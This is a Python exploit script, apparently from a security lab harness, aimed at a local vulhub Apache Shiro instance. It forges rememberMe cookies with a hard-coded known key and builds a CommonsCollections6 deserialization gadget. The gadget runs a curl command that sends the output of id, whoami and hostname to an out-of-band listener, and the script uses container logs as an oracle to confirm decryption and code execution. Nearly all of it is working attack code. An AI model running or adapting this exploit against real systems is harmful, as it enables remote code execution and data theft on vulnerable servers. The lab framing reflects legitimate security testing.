#!/usr/bin/env python3
# loop3 t7 C1 补充：决定性日志 oracle —— AbstractRememberMeManager.deserialize 阶段锚点
#
# 发现：日志里有一条【只在反序列化成功后才会出现】的锚点：
#   java.lang.ClassCastException: java.util.HashSet cannot be cast to
#       org.apache.shiro.subject.PrincipalCollection
#     at AbstractRememberMeManager.deserialize(AbstractRememberMeManager.java:514)
#     at AbstractRememberMeManager.convertBytesToPrincipals(AbstractRememberMeManager.java:431)
#   —— 反序列化【已成功】产出对象，只是类型不是 PrincipalCollection 才抛 ClassCast。
#   对比：密钥错误时抛的是 convertBytesToPrincipals(AbstractRememberMeManager.java:429) + BadPaddingException。
#   => 两个锚点的【行号不同】(429 vs 431)，可精确区分「解密失败」与「解密成功、反序列化成功」。
#
# 本脚本做受控复现：每步用 docker logs --since 精确切片，避免被旧日志污染。
import json, os, re, subprocess, sys, time, datetime, hashlib
import requests

CWD = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
EV = os.path.join(CWD, r"security\learning\_evidence")
SHIRO = "http://127.0.0.1:18081/"
OOB_HOST, OOB_PORT = "192.168.65.254", 8099
OOB_LOG = os.path.join(EV, "loop3-t7-c1-oob.jsonl")
UA = "loop3-t7/1.0 (authorized local lab)"
KEY = "kPH+bIxk5D2deZiIxcaaaA=="
OUT_PATH = os.path.join(EV, "loop3-t7-c1-logoracle-20261012.json")
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:900], flush=True)
    return kw


def kali(cmd):
    r = subprocess.run([sys.executable, r"dsh-tools\kali-run.py", cmd], capture_output=True, text=True, cwd=CWD)
    return r.stdout + r.stderr


def clean_b64(s):
    m = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", s)
    return max(m, key=len) if m else ""


def logs_new(baseline_lines):
    r = subprocess.run("docker logs vulhub-shiro-18081", shell=True, capture_output=True, text=True)
    return ((r.stdout or "") + (r.stderr or "")).splitlines()[baseline_lines:]


def nlines():
    r = subprocess.run("docker logs vulhub-shiro-18081", shell=True, capture_output=True, text=True)
    return len(((r.stdout or "") + (r.stderr or "")).splitlines())


def send(ck):
    time.sleep(1.3)
    r = requests.get(SHIRO, headers={"User-Agent": UA, "Cookie": "rememberMe=" + ck},
                     timeout=40, allow_redirects=False)
    return {"status": r.status_code, "deleteMe": ("rememberMe=deleteMe" in r.headers.get("Set-Cookie", ""))}


def anchors(lines):
    txt = "\n".join(lines)
    return {
        "badpadding": txt.count("BadPaddingException"),
        "cc_hashset": txt.count("HashSet cannot be cast"),
        "deser_431_line": txt.count("convertBytesToPrincipals(AbstractRememberMeManager.java:431)"),
        "deser_429_line": txt.count("convertBytesToPrincipals(AbstractRememberMeManager.java:429)"),
        "ClassResolving": txt.count("ClassResolvingObjectInputStream"),
        "EOF": txt.count("EOFException"),
    }


print("=" * 78)

# ---------- A) 错误密钥 ----------
kali("ruby /tmp/t7-c1-matrix.rb >/dev/null 2>&1")
time.sleep(1)
ck_wrong = clean_b64(kali("cat /tmp/t7-c1-matrix/P5_wrongkey_garbage.txt"))
b = nlines()
r = send(ck_wrong)
time.sleep(3)
new = logs_new(b)
rec("A_wrongkey", response=r, new_log_lines=len(new), anchors=anchors(new))

# ---------- B) 正确密钥 + 合法序列化 String ----------
ck_str = clean_b64(kali("cat /tmp/t7-c1-matrix/P1_valid_serialized_string.txt"))
b = nlines()
r = send(ck_str)
time.sleep(3)
new = logs_new(b)
rec("B_validkey_serializedString", response=r, new_log_lines=len(new), anchors=anchors(new),
    captured=[l.strip() for l in new if "Exception" in l or "RememberMeManager" in l][:6])

# ---------- C) 正确密钥 + CC6 链（真实 gadget，只读命令 + OOB）----------
tag = "t7logoracle-cc6"
cmd = f"curl -s http://{OOB_HOST}:{OOB_PORT}/{tag}-$(id -u)-$(whoami)-$(hostname)"
kali(f"ruby /tmp/t7-c1-shiro-gen.rb CommonsCollections6 '{cmd}' /tmp/t7-logoracle-cc6.txt '{KEY}' >/dev/null 2>&1")
ck_cc6 = clean_b64(kali("cat /tmp/t7-logoracle-cc6.txt"))
b = nlines()
r = send(ck_cc6)
time.sleep(3.5)
new = logs_new(b)
hits = []
if os.path.exists(OOB_LOG):
    for line in open(OOB_LOG, encoding="utf-8", errors="replace"):
        try:
            e = json.loads(line)
            if tag in (e.get("path") or ""):
                hits.append(e)
        except Exception:
            pass
rec("C_validkey_CC6_RCE", response=r, new_log_lines=len(new), anchors=anchors(new),
    captured=[l.strip() for l in new if "Exception" in l or "RememberMeManager" in l][:8],
    oob_hits=len(hits), oob_paths=[h["path"] for h in hits][:2])

# ---------- D) 判定 ----------
steps = {s["step"]: s for s in OUT["steps"]}
a, c = steps.get("A_wrongkey", {}), steps.get("C_validkey_CC6_RCE", {})
rec("verdict",
    wrongkey_shows_BadPadding=(a.get("anchors", {}).get("badpadding", 0) > 0),
    cc6_oob_hits=c.get("oob_hits", 0),
    cc6_shows_classcast=(c.get("anchors", {}).get("cc_hashset", 0) > 0),
    conclusion="错误密钥 -> 日志 BadPaddingException（解密失败，行号 429）；"
               "正确密钥的 gadget -> 解密+反序列化成功（行号 431）+ OOB 命令输出命中；"
               "两者行号不同，构成可复现的日志级 oracle")

# 原始 bruteforce 证据完整性
bf = os.path.join(EV, "t7-c1-bruteforce-out.txt")
rec("bruteforce_file_untouched", sha256=hashlib.sha256(open(bf, "rb").read()).hexdigest(),
    size=os.path.getsize(bf), note="按队长指令未删改；EXECUTED_KEYS=[] 已标注为 oracle 失效导致的无效结论")

with open(OUT_PATH, "w", encoding="utf-8") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok"}))
